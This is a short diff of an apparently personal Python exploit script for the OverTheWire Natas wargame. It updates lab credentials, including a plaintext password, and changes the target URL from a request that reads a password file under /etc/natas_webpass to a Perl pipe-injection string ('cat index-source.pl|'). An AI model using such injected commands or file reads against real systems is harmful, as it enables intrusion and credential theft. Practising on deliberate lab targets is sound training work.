@@ -15,9 +15,9 @@ def pretty_print_POST(req):
         req.body,
     ))
 
-user_auth = ('natas31','hay7aecuungiuKaezuathuk9biin0pu1')
+user_auth = ('natas32','no1vohsheCaiv3ieH4em1ahchisainge')
 
-target = 'http://natas31.natas.labs.overthewire.org/index.pl?/etc/natas_webpass/natas32'
+target = 'http://natas32.natas.labs.overthewire.org/index.pl?cat index-source.pl|'
 #target = 'http://httpbin.org/post'
 
 file2 = [
@@ -50,5 +50,7 @@ print '-' * 60
 
 
 print response.text
+
+
 
 
